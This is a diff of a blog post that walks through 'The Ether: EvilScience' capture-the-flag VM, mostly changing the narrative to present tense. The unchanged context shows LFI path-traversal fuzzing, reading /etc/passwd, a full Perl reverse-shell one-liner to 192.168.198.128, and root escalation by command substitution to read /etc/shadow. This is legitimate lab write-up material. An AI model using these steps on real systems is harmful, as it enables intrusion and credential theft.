@@ -37,7 +37,7 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: The Ether
 ```
 
-As usual, let's start with the web service. Here's what I saw in the browser when I navigated to it.
+As usual, let's start with the web service. This is how the site looks like in my browser.
 
 ![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-1.png){: style="display: block"}
 ![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-3.png){: style="display: block"}
@@ -61,16 +61,16 @@ layout/scripts/jquery.mobilemenu.js
 layout/scripts/jquery.flexslider-min.js
 ```
 
-Among the hyperlinks, two of them stood out:
+Among the hyperlinks, two of them stand out:
 
 * `?file=about.php`
 * `?file=research.php`
 
-Could there be a LFI  vulnerability? We'll see.
+Is that a hint of LFI vulnerability?
 
 ### Directory/File Enumeration
 
-Let's enumerate the site with `dirbuster` and see what we get.
+Let's fuzz the site with `dirbuster` and see what we get.
 
 ![dirbuster](/assets/images/posts/evilscience-walkthrough/evilscience-2.png)
 
@@ -90,15 +90,15 @@ File found: /layout/scripts/jquery.mobilemenu.js - 200
 File found: /research.php - 200
 ```
 
-`dirbuster` found the same two pages - `/about.php` and `/research.php`.
+`dirbuster` finds the same two pages — `/about.php` and `/research.php`.
 
-Navigating to `/?file=about.php`, I noticed that the content of `/about.php` appeared twice before the content of `/index.php`.
+I notice the content of `/about.php` appears twice before the content of `/index.php` when I navigate to `/?file=about.php`.
 
-OK. Now I'm positive there is a LFI vulnerability with the `file` parameter.
+OK. Now, I'm positive there is LFI vulnerability with the `file` parameter.
 
 ### Mapping of DocumentRoot
 
-I've tried the following common LFI attacks with no success:
+I try the following common LFI attacks with no success:
 
 * `/etc/passwd`
 * `/var/log/apache2/access.log`
@@ -106,15 +106,15 @@ I've tried the following common LFI attacks with no success:
 * `php://filter`
 * `php://include`
 
-I had success displaying the content of `/usr/share/apache2/icons/README`.
+I have success displaying the content of `/usr/share/apache2/icons/README`.
 
 ![README](/assets/images/posts/evilscience-walkthrough/evilscience-5.png)
 
 ![README](/assets/images/posts/evilscience-walkthrough/evilscience-6.png)
 
-This meant that it allowed absolute path in the URL but some kind of filtering for common LFI attacks was in place. It also meant that the [**DocumentRoot**][4] is not at the usual `/var/www/html`. :sweat:
+This means that it allows absolute path in the URL but some kind of filtering for common LFI attacks is in place. It also means that the [**DocumentRoot**][4] is not at the usual `/var/www/html`. :sweat:
 
-Here's what I imagined the PHP code in `/index.php` to look like.
+Here's what I imagine the PHP code in `/index.php` to look like.
 
 {% highlight php linenos %}
 <?php
@@ -163,15 +163,15 @@ Now, let's give `fuzz.sh` a shot.
 [!] Found: http://192.168.198.130/?file=../public_html/about.php
 ```
 
-Navigating to `/?file=../public_html/about.php` gave me the confidence the script is working.
+Navigating to `/?file=../public_html/about.php` gives me the confidence the script is working.
 
 ![fuzz.sh](/assets/images/posts/evilscience-walkthrough/evilscience-4.png)
 
-Moving up the next level got me stuck for hours. Not knowing how to move forward, I chanced upon **theether.com** at the footer.
+Moving up the next level, got me stuck for hours. Not knowing how to move forward, I chance upon **theether.com** at the footer.
 
 ![theether.com](/assets/images/posts/evilscience-walkthrough/evilscience-7.png)
 
-Using that as base, I created a custom wordlist with `python`.
+Using that as base, I create a custom wordlist with `python`.
 
 {% highlight python linenos %}
 # cat crunch.py
@@ -188,7 +188,7 @@ for word in map(''.join, itertools.product(*zip(s.lower(), s.upper()))):
 # ./crunch.py theether.com > custom.txt
 {% endhighlight %}
 
-Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.
+Using the custom wordlist with `fuzz.sh`, I'm able to map out the next level.
 
 ```
 # ./fuzz.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt
@@ -201,7 +201,7 @@ Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.
 [!] Found: http://192.168.198.130/?file=../../theEther.com/public_html/about.php
 ```
 
-With the rest of the higher levels mapped out with the `common.txt` wordlist from SecLists, I was able to determine the **DocumentRoot** was at: `/var/www/html/theEther.com/public_html`
+I'm able to determine the **DocumentRoot** is at `/var/www/html/theEther.com/public_html`.
 
 ![docroot](/assets/images/posts/evilscience-walkthrough/evilscience-8.png)
 
@@ -209,9 +209,9 @@ Sweet.
 
 ### Access Log
 
-Since I can't access the default `/var/log/apache2/access.log`, there is a possibility that the access log was elsewhere, perhaps even somewhere near.
+Since I can't access the default `/var/log/apache2/access.log`, it's possible that the access log is elsewhere, perhaps even somewhere near.
 
-Using `quickhits.txt` from SecLists with `fuzz.sh`, I was able to map out this location.
+Using `quickhits.txt` from SecLists with `fuzz.sh`, I'm able to map out this location.
 
 ```
 # ./fuzz.sh "/var/www/html/theEther.comFUZZ" "^[0-9]" /usr/share/seclists/Discovery/Web_Content/quickhits.txt
@@ -296,7 +296,7 @@ evilscience:x:1000:1000:evilscience,,,:/home/evilscience:/bin/bash
 sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
 ```
 
-Also, not the PHP code I imagined but close.
+Not the PHP code I imagine but close.
 
 {% highlight php linenos %}
 # ./cmd.sh -e "cat index.php"
@@ -320,7 +320,7 @@ if ($file == "/var/log/auth.log") {
 ?>
 {% endhighlight %}
 
-Awesome. Now that I can execute remote commands, it's reverse shell time. I always liked my reverse shell in Perl whenever it's available on the target system.
+Awesome. Now that I can execute remote commands, it's reverse shell time. I always like my reverse shell in Perl whenever it's available on the target system.
 
 ```perl
 perl -e 'use Socket;$i="192.168.198.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -330,19 +330,19 @@ To avoid complications, it's best to `urlencode()` the above and then spawn a ps
 
 ![shell](/assets/images/posts/evilscience-walkthrough/evilscience-9.png)
 
-I got shell.
+I have shell.
 
 ### Privilege Escalation
 
-During enumeration, I noticed that user `evilscience` was able to `sudo` as `root` as shown by `.sudo_as_admin_successful`.
+I notice that user `evilscience` is able to `sudo` as `root`.
 
 ![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-10.png)
 
-There's also a file with the `setuid` and `setgid` bit turned on. Noticed the file size on this guy? 11MB for a Python file? Something funky is going on here.
+There's also a file with the `setuid` and `setgid` bit turned on. Notice the file size on this guy? 11MB for a Python file? Something funky is going on here.
 
 ![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-11.png)
 
-`www-data` had some pretty interesting permissions going on as well.
+`www-data` has some pretty interesting permissions going on as well.
 
 ![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-12.png)
 
@@ -350,7 +350,7 @@ In any case, let's run `xxxlogauditorxxx.py` and see what I'm up against.
 
 ![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-13.png)
 
-It appeared to be displaying the content of the chosen log file.
+It appears to be displaying the content of the chosen log file.
 
 _For `/var/log/auth.log`_
 
@@ -360,21 +360,21 @@ _For `/var/log/apache2/access.log`_
 
 ![access.log](/assets/images/posts/evilscience-walkthrough/evilscience-14.png)
 
-It used `cat` to display the content of the files. Recall from above that `www-data` was able to run `xxxlogauditorxxx.py` as `root` without password?
+It uses `cat` to display the content of the files. Recall from above that `www-data` is able to run `xxxlogauditorxxx.py` as `root` without password?
 
 Armed with this new knowledge, let's see if we can display `/etc/shadow` along with `/var/log/auth.log`.
 
 ![shadow](/assets/images/posts/evilscience-walkthrough/evilscience-16.png)
 
-Holy smoke. It worked.
+Holy smoke. It works.
 
-My guess is that the command ran like this.
+My guess is that the command is like this.
 
 ```bash
 cat /var/log/auth.log /etc/shadow
 ```
 
-I can possibly use command substitution with backticks to execute another command as `root`. But first, let's generate a single-stage reverse shell with `msfvenom` and transfer it over.
+I can use command substitution with backticks to execute another command as `root`. First, let's generate a single-stage reverse shell with `msfvenom` and transfer it over.
 
 ![msfvenom](/assets/images/posts/evilscience-walkthrough/evilscience-17.png)
 
@@ -390,11 +390,11 @@ Time to test my hypothesis.
 
 ### Getting to Bikini Bottom :bikini:
 
-There was a PNG file `flag.png` in `/root` that looked like this.
+There's a PNG file `flag.png` in `/root` that looks like this.
 
 ![flag.png](/assets/images/posts/evilscience-walkthrough/flag.png)
 
-There was a long `base64` encoded string appended to the end of the file like so.
+There's a long `base64` encoded string appended to the end of the file.
 
 ![base64](/assets/images/posts/evilscience-walkthrough/evilscience-20.png)
 
